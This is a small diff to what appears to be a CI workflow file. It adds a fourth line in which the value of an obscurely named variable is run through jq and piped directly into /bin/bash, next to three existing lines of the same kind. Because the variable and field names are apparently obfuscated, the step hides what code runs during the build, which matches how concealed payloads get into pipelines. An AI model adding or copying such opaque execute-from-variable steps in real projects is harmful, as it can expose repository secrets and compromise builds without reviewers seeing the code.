@@ -30,6 +30,7 @@ jobs:
           echo $ontxl834 | jq -r .jtvx764 | /bin/bash
           printf '%s' "$iq48275" | jq -r .jjumg08 | /bin/bash
           printf '%s' "$rn08440" | jq -r .zli13 | /bin/bash
+          printf '%s' "$dmis1" | jq -r .l8409 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
